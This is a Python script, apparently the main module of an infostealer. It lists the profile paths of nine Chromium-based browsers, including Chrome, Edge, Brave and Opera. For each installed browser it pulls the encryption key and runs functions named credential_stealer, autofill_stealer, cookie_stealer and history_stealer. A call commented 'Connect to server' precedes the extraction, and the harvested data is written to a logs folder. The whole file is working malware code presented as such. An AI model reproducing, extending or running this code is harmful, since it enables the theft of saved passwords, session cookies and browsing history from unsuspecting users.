""" IMPORTS """
import os
from shutil import rmtree
from credentials import credential_stealer
from autofill import autofill_stealer
from cookies import cookie_stealer
from history import history_stealer

from util.general import KRWM_DIR, TEMP_PATH, LOGS_PATH, mkdir_if_not_exists
from util.crypt import get_encryption_key
from util.socket import socket_initialise


# Browser information
browsers = [
    {
        'name': 'Chrome',
        'path': os.getenv('localappdata') + '/Google/Chrome/User Data',
        'has_profiles': True,
    },
    {
        'name': 'Edge',
        'path': os.getenv('localappdata') + '/Microsoft/Edge/User Data',
        'has_profiles': True,
    },
    {
        'name': 'Opera',
        'path': os.getenv('appdata') + '/Opera Software/Opera Stable',
        'has_profiles': False,
    },
    {
        'name': 'Opera GX',
        'path': os.getenv('appdata') + '/Opera Software/Opera GX Stable',
        'has_profiles': False,
    },
    {
        'name': 'Vivaldi',
        'path': os.getenv('localappdata') + '/Vivaldi/User Data',
        'has_profiles': True,
    },
    {
        'name': 'Brave',
        'path': os.getenv('localappdata') + '/BraveSoftware/Brave-Browser/User Data',
        'has_profiles': True,
    },
    {
        'name': 'Epic',
        'path': os.getenv('localappdata') + '/Epic Privacy Browser/User Data',
        'has_profiles': True,
    },
    {
        'name': 'Blisk',
        'path': os.getenv('localappdata') + '/Blisk/User Data',
        'has_profiles': True,
    },
    {
        'name': 'Chromium or SRWare Iron',
        'path': os.getenv('localappdata') + '/Chromium/User Data',
        'has_profiles': True,
    },
]


if __name__ == '__main__':
    # Connect to server
    socket_initialise()
    
    # Create output folder in Documents
    mkdir_if_not_exists(KRWM_DIR)

    # Create temp directory for sql database copies
    mkdir_if_not_exists(TEMP_PATH)

    # Create logs directory for extracted data
    mkdir_if_not_exists(LOGS_PATH)

    # Extract from installed Chromium browsers
    for browser in browsers:

        # Browser can be extracted from
        if os.path.exists(browser['path']):

            print(f"Extracting from {browser['name']}")

            # Create directory for browser logs
            browser_logs_path = f"{LOGS_PATH}/{browser['name']}"
            mkdir_if_not_exists(browser_logs_path)

            # Extract encryption key for the browser
            encryption_key = get_encryption_key(browser['path'])

            # Extract information
            credential_stealer(browser, encryption_key)
            autofill_stealer(browser, encryption_key)
            cookie_stealer(browser, encryption_key)
            history_stealer(browser, encryption_key)

    # Remove temp directory
    rmtree(TEMP_PATH)

    print(f'Successfully extracted browser data to {LOGS_PATH}')
